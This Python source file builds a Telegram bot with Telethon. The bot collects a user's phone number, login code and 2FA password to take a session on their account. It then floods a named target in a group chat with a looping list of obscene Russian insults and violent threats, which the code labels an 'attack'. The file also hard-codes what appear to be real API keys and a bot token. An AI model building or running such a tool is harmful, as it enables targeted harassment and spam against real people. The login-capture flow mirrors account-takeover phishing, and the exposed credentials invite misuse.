import asyncio
import os
import random
import re
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.custom import Button

API_ID = 39163151
API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
BOT_TOKEN = '8261586650:AAHzcH1I-kMAZ9lq7DRk9mpX7ED7I3zvKVQ'

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

bot_client = TelegramClient(os.path.join(SESSION_DIR, 'bot_session'), API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_client = None
user_auth_data = {}
active_bites = {}

insults = [
    "я твою мать ебал",
    "я твою мать ебал в жопу",
    "я твою мать ебал в рот",
    "твоя мать шалава",
    "ты гнойный мешок",
    "я ломал твои ребра об асфальт",
    "ты никто",
    "я твой палач",
    "ты мразь",
]

def get_digit_keyboard():
    return [
        [Button.inline("1"), Button.inline("2"), Button.inline("3")],
        [Button.inline("4"), Button.inline("5"), Button.inline("6")],
        [Button.inline("7"), Button.inline("8"), Button.inline("9")],
        [Button.inline("0"), Button.inline("◀️"), Button.inline("✅")]
    ]

def get_clear_keyboard():
    return Button.clear()

async def bite_loop(target_id, chat_id, stop_event):
    global user_client
    while not stop_event.is_set():
        for insult in insults:
            if stop_event.is_set():
                break
            try:
                await user_client.send_message(chat_id, f'@{target_id} {insult}')
                await asyncio.sleep(0.3)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except:
                pass

# ========== АВТОРИЗАЦИЯ ==========
@bot_client.on(events.NewMessage)
async def auth_handler(event):
    global user_client
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id

    if chat_id != user_id:
        return

    if text == '/start':
        if user_client and user_client.is_connected():
            await event.reply("✅ Уже авторизован. Команды: .ку @username")
            return
        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
        await event.reply("🔐 Отправь номер своего аккаунта", buttons=buttons)
        return

    if event.contact:
        phone = event.contact.phone_number
        if not phone or user_id in user_auth_data:
            return
        session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        try:
            result = await user_client.send_code_request(phone)
            user_auth_data[user_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'temp_input': ''
            }
            await event.reply(f"✅ Код на {phone[-4:]}\n\nВведи код:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.reply(f"❌ {e}")
        return

@bot_client.on(events.CallbackQuery)
async def callback_handler(event):
    global user_client
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if user_id not in user_auth_data:
        await event.answer("Нажми /start", alert=True)
        return
    
    auth = user_auth_data[user_id]
    
    if data == '✅':
        code = auth.get('temp_input', '')
        if len(code) < 3:
            await event.answer("Короткий код", alert=True)
            return
        try:
            await user_client.sign_in(
                phone=auth['phone'],
                code=code,
                phone_code_hash=auth['phone_code_hash']
            )
            del user_auth_data[user_id]
            await event.edit("✅ Авторизован!\n\n.ку @username", buttons=get_clear_keyboard())
            print("✅ АВТОРИЗАЦИЯ УСПЕШНА")
        except SessionPasswordNeededError:
            auth['state'] = 'password_waiting'
            auth['temp_input'] = ''
            await event.edit("🔐 Введи 2FA пароль:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
            del user_auth_data[user_id]
    elif data == '◀️':
        auth['temp_input'] = auth.get('temp_input', '')[:-1]
        display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
        await event.edit(display, buttons=get_digit_keyboard())
    elif data.isdigit():
        auth['temp_input'] = auth.get('temp_input', '') + data
        display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
        await event.edit(display, buttons=get_digit_keyboard())
    elif auth.get('state') == 'password_waiting':
        if data == '✅':
            pwd = auth.get('temp_input', '')
            if len(pwd) < 1:
                await event.answer("Введи пароль", alert=True)
                return
            try:
                await user_client.sign_in(password=pwd)
                del user_auth_data[user_id]
                await event.edit("✅ Авторизован!\n\n.ку @username", buttons=get_clear_keyboard())
                print("✅ АВТОРИЗАЦИЯ УСПЕШНА (2FA)")
            except Exception:
                await event.answer("Неверный пароль", alert=True)
                auth['temp_input'] = ''
                await event.edit("🔐 Неверный пароль, попробуй снова:", buttons=get_digit_keyboard())
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())

# ========== КОМАНДЫ ==========
@bot_client.on(events.NewMessage)
async def command_handler(event):
    global user_client, active_bites
    
    # Проверяем, есть ли авторизованный аккаунт
    if not user_client:
        return
    
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id
    
    # Игнорируем личку с ботом
    if chat_id == user_id:
        return
    
    # Проверяем начало команды
    if not text.startswith('.'):
        return
    
    # Разбираем команду
    parts = text[1:].split()
    if not parts:
        return
    cmd = parts[0].lower()
    
    print(f"[LOG] Команда: {cmd}, аргументы: {parts[1:] if len(parts) > 1 else 'нет'}")  # для отладки
    
    # .ку @username
    if cmd == 'ку' and len(parts) > 1:
        target = parts[1].replace('@', '')
        try:
            entity = await user_client.get_entity(target)
            target_id = entity.id
            key = f"{chat_id}_{target_id}"
            if key in active_bites:
                await event.reply('❌ Уже атакуешь')
                return
            stop = asyncio.Event()
            task = asyncio.create_task(bite_loop(target_id, chat_id, stop))
            active_bites[key] = (task, stop)
            await event.reply(f'⚔️ Атака на @{target} начата')
        except Exception as e:
            await event.reply(f'❌ Не найден: {target}')
        return
    
    # .кустоп
    if cmd == 'кустоп':
        removed = False
        for key in list(active_bites.keys()):
            if key.startswith(f"{chat_id}_"):
                task, stop = active_bites[key]
                stop.set()
                task.cancel()
                del active_bites[key]
                removed = True
        if removed:
            await event.reply('🛑 Атака остановлена')
        else:
            await event.reply('❌ Нет активной атаки')
        return
    
    # .пинг
    if cmd == 'пинг':
        await event.reply('🏓 Понг!')
        return

async def main():
    await bot_client.start()
    me = await bot_client.get_me()
    print(f'✅ Бот: @{me.username}')
    print('👉 Напиши боту /start, авторизуй свой аккаунт')
    print('👉 Команды: .ку @username | .кустоп | .пинг')
    await bot_client.run_until_disconnected()

with bot_client:
    bot_client.loop.run_until_complete(main())